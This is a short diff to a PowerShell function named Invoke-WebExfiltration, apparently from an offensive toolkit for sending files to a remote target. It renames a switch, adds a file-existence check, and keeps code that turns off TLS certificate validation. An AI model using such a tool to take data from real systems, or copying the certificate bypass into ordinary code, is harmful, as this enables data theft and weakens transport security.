@@ -56,7 +56,7 @@ Function Invoke-WebExfiltration
         )]
         [string]$Target = 'TARGET_PLACEHOLDER',
         [String]$Password,
-        [switch]$Insecure
+        [switch]$IgnoreCertificateCheck
     )
 
     Begin {
@@ -79,7 +79,12 @@ Function Invoke-WebExfiltration
     }
 
     Process {
-        if ((Get-Item $file) -is [System.IO.DirectoryInfo])
+        if (-not (Test-Path -Path $file )){
+            Write-Host "[X] Error: '$file' does not exist."
+            break
+        }
+
+        if ((Get-Item $file -ErrorAction Stop) -is [System.IO.DirectoryInfo])
         {
             Write-Verbose "'$file' is a directory. Skipping..."
             return
@@ -166,7 +171,7 @@ Function Invoke-WebExfiltration
 
         try
         {
-            if ($Insecure)
+            if ($IgnoreCertificateCheck)
             {
                 Write-Verbose "Ignoring certificate check"
                 [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
